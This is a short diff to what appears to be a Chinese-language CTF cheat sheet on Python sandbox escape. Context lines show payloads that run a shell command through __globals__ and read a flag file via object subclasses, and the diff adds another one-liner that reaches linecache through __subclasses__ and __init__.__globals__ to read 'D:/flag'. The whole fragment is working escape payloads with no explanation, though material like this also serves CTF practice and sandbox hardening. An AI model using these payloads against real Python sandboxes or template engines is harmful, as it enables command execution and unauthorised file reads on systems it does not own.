@@ -171,6 +171,7 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```python
 #读取文件
 "".__class__.__mro__[-1].__subclasses__()[40]("D:/flag").read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].getline("D:/flag",1)
 ```
 ## **Python3 POC**
 ```python
